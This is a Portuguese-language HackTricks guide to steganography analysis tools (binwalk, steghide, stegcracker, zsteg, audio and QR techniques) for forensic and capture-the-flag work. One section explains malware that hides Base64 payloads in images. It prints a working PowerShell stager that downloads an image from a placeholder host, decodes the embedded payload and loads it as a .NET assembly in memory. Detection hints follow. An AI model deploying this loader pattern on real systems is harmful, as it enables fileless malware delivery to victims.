# Truques de Stego

{{#include ../banners/hacktricks-training.md}}

## **Extraindo Dados de Arquivos**

### **Binwalk**

Uma ferramenta para procurar em arquivos binários por arquivos e dados ocultos embutidos. É instalada via `apt` e seu código-fonte está disponível no [GitHub](https://github.com/ReFirmLabs/binwalk).
```bash
binwalk file # Displays the embedded data
binwalk -e file # Extracts the data
binwalk --dd ".*" file # Extracts all data
```
### **Foremost**

Recupera arquivos com base em seus cabeçalhos e rodapés, útil para imagens png. Instalado via `apt` com seu código-fonte no [GitHub](https://github.com/korczis/foremost).
```bash
foremost -i file # Extracts data
```
### **Exiftool**

Ajuda a visualizar metadados de arquivos, disponível [here](https://www.sno.phy.queensu.ca/~phil/exiftool/).
```bash
exiftool file # Shows the metadata
```
### **Exiv2**

Semelhante ao exiftool, para visualização de metadados. Instalável via `apt`, código-fonte em [GitHub](https://github.com/Exiv2/exiv2), e possui um [site oficial](http://www.exiv2.org/).
```bash
exiv2 file # Shows the metadata
```
### **Arquivo**

Identifique o tipo de arquivo com o qual você está lidando.

### **Strings**

Extrai strings legíveis de arquivos, usando várias configurações de codificação para filtrar a saída.
```bash
strings -n 6 file # Extracts strings with a minimum length of 6
strings -n 6 file | head -n 20 # First 20 strings
strings -n 6 file | tail -n 20 # Last 20 strings
strings -e s -n 6 file # 7bit strings
strings -e S -n 6 file # 8bit strings
strings -e l -n 6 file # 16bit strings (little-endian)
strings -e b -n 6 file # 16bit strings (big-endian)
strings -e L -n 6 file # 32bit strings (little-endian)
strings -e B -n 6 file # 32bit strings (big-endian)
```
### **Comparison (cmp)**

Útil para comparar um arquivo modificado com sua versão original encontrada online.
```bash
cmp original.jpg stego.jpg -b -l
```
## **Extraindo Dados Ocultos em Texto**

### **Dados Ocultos em Espaços**

Caracteres invisíveis em espaços aparentemente vazios podem ocultar informações. Para extrair esses dados, visite [https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder](https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder).

## **Extraindo Dados de Imagens**

### **Identificando Detalhes de Imagens com GraphicMagick**

[GraphicMagick](https://imagemagick.org/script/download.php) é usado para determinar o tipo de arquivo de imagem e identificar possíveis corrupções. Execute o comando abaixo para inspecionar uma imagem:
```bash
./magick identify -verbose stego.jpg
```
Para tentar reparar uma imagem danificada, adicionar um comentário de metadata pode ajudar:
```bash
./magick mogrify -set comment 'Extraneous bytes removed' stego.jpg
```
### **Steghide para Ocultação de Dados**

Steghide facilita esconder dados dentro de `JPEG, BMP, WAV, and AU` files, sendo capaz de embutir e extrair dados criptografados. A instalação é simples usando `apt`, e seu [código-fonte está disponível no GitHub](https://github.com/StefanoDeVuono/steghide).

**Comandos:**

- `steghide info file` revela se um arquivo contém dados ocultos.
- `steghide extract -sf file [--passphrase password]` extrai os dados ocultos, senha opcional.

Para extração via web, visite [este website](https://futureboy.us/stegano/decinput.html).

**Bruteforce Attack with Stegcracker:**

- Para tentar quebrar a senha do Steghide, use [stegcracker](https://github.com/Paradoxis/StegCracker.git) da seguinte forma:
```bash
stegcracker <file> [<wordlist>]
```
### **zsteg para arquivos PNG e BMP**

zsteg se especializa em descobrir dados ocultos em arquivos PNG e BMP. A instalação é feita via `gem install zsteg`, com seu [source on GitHub](https://github.com/zed-0xff/zsteg).

**Commands:**

- `zsteg -a file` applies all detection methods on a file.
- `zsteg -E file` specifies a payload for data extraction.

### **StegoVeritas e Stegsolve**

**stegoVeritas** verifica metadados, realiza transformações de imagem e aplica força bruta LSB, entre outros recursos. Use `stegoveritas.py -h` para a lista completa de opções e `stegoveritas.py stego.jpg` para executar todas as verificações.

**Stegsolve** aplica vários filtros de cor para revelar textos ou mensagens ocultas dentro de imagens. Está disponível no [GitHub](https://github.com/eugenekolo/sec-tools/tree/master/stego/stegsolve/stegsolve).

### **FFT para detecção de conteúdo oculto**

Técnicas de Fast Fourier Transform (FFT) podem revelar conteúdo oculto em imagens. Recursos úteis incluem:

- [EPFL Demo](http://bigwww.epfl.ch/demo/ip/demos/FFT/)
- [Ejectamenta](https://www.ejectamenta.com/Fourifier-fullscreen/)
- [FFTStegPic on GitHub](https://github.com/0xcomposure/FFTStegPic)

### **Stegpy para arquivos de áudio e imagem**

Stegpy permite embutir informações em arquivos de imagem e áudio, suportando formatos como PNG, BMP, GIF, WebP e WAV. Está disponível no [GitHub](https://github.com/dhsdshdhk/stegpy).

### **Pngcheck para análise de arquivos PNG**

Para analisar arquivos PNG ou validar sua autenticidade, use:
```bash
apt-get install pngcheck
pngcheck stego.png
```
### **Ferramentas adicionais para análise de imagens**

For further exploration, consider visiting:

- [Magic Eye Solver](http://magiceye.ecksdee.co.uk/)
- [Image Error Level Analysis](https://29a.ch/sandbox/2012/imageerrorlevelanalysis/)
- [Outguess](https://github.com/resurrecting-open-source-projects/outguess)
- [OpenStego](https://www.openstego.com/)
- [DIIT](https://diit.sourceforge.net/)

## Marker-delimited Base64 payloads hidden in images (malware delivery)

Commodity loaders cada vez mais escondem payloads codificados em Base64 como texto simples dentro de imagens válidas (frequentemente GIF/PNG). Em vez do LSB a nível de pixel, o payload é delimitado por strings de marcador de início/fim únicas embutidas no texto/metadados do ficheiro. A PowerShell stager então:
- Faz o download da imagem via HTTP(S)
- Localiza as marker strings (exemplos observados: <<sudo_png>> … <<sudo_odt>>)
- Extrai o texto entre os marcadores e decodifica Base64 para bytes
- Carrega a assembly .NET em memória e invoca um método de entrada conhecido (nenhum ficheiro escrito no disco)

Snippet mínimo de carving/loading em PowerShell
```powershell
$img = (New-Object Net.WebClient).DownloadString('https://example.com/p.gif')
$start = '<<sudo_png>>'; $end = '<<sudo_odt>>'
$s = $img.IndexOf($start); $e = $img.IndexOf($end)
if($s -ge 0 -and $e -gt $s){
$b64 = $img.Substring($s + $start.Length, $e - ($s + $start.Length))
$bytes = [Convert]::FromBase64String($b64)
[Reflection.Assembly]::Load($bytes) | Out-Null
}
```
Notas
- This falls under ATT&CK T1027.003 (steganography). Os marcadores variam entre campanhas.
- Hunting: escaneie imagens baixadas por delimitadores conhecidos; marque `PowerShell` que usa `DownloadString` seguido de `FromBase64String`.

Veja também exemplos de entrega de phishing e o fluxo completo de invocação em memória aqui:

{{#ref}}
../generic-methodologies-and-resources/phishing-methodology/phishing-documents.md
{{#endref}}

## **Extraindo Dados de Áudios**

**Áudio steganography** oferece um método único para ocultar informações dentro de arquivos de som. Diferentes ferramentas são utilizadas para embutir ou recuperar conteúdo oculto.

### **Steghide (JPEG, BMP, WAV, AU)**

Steghide é uma ferramenta versátil projetada para esconder dados em arquivos JPEG, BMP, WAV e AU. Instruções detalhadas são fornecidas em [stego tricks documentation](stego-tricks.md#steghide).

### **Stegpy (PNG, BMP, GIF, WebP, WAV)**

Esta ferramenta é compatível com vários formatos, incluindo PNG, BMP, GIF, WebP e WAV. Para mais informações, consulte [Stegpy's section](stego-tricks.md#stegpy-png-bmp-gif-webp-wav).

### **ffmpeg**

ffmpeg é crucial para avaliar a integridade de arquivos de áudio, fornecendo informações detalhadas e identificando quaisquer discrepâncias.
```bash
ffmpeg -v info -i stego.mp3 -f null -
```
### **WavSteg (WAV)**

WavSteg se destaca em ocultar e extrair dados em arquivos WAV usando a estratégia LSB (bit menos significativo). Está disponível no [GitHub](https://github.com/ragibson/Steganography#WavSteg). Comandos incluem:
```bash
python3 WavSteg.py -r -b 1 -s soundfile -o outputfile

python3 WavSteg.py -r -b 2 -s soundfile -o outputfile
```
### **Deepsound**

Deepsound permite a criptografia e detecção de informações dentro de arquivos de áudio usando AES-256. Pode ser baixado da [the official page](http://jpinsoft.net/deepsound/download.aspx).

### **Sonic Visualizer**

Uma ferramenta inestimável para inspeção visual e analítica de arquivos de áudio, Sonic Visualizer pode revelar elementos ocultos indetectáveis por outros meios. Visite o [official website](https://www.sonicvisualiser.org/) para mais.

### **DTMF Tones - Dial Tones**

A detecção de tons DTMF em arquivos de áudio pode ser feita através de ferramentas online como [this DTMF detector](https://unframework.github.io/dtmf-detect/) e [DialABC](http://dialabc.com/sound/detect/index.html).

## **Outras Técnicas**

### **Binary Length SQRT - QR Code**

Dados binários cujo comprimento é um quadrado perfeito podem representar um QR code. Use este snippet para verificar:
```python
import math
math.sqrt(2500) #50
```
Para conversão de binário para imagem, consulte [dcode](https://www.dcode.fr/binary-image). Para ler códigos QR, use [this online barcode reader](https://online-barcode-reader.inliteresearch.com/).

### **Tradução de Braille**

Para traduzir Braille, o [Branah Braille Translator](https://www.branah.com/braille-translator) é um excelente recurso.

## **Referências**

- [**https://0xrick.github.io/lists/stego/**](https://0xrick.github.io/lists/stego/)
- [**https://github.com/DominicBreuker/stego-toolkit**](https://github.com/DominicBreuker/stego-toolkit)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)

{{#include ../banners/hacktricks-training.md}}
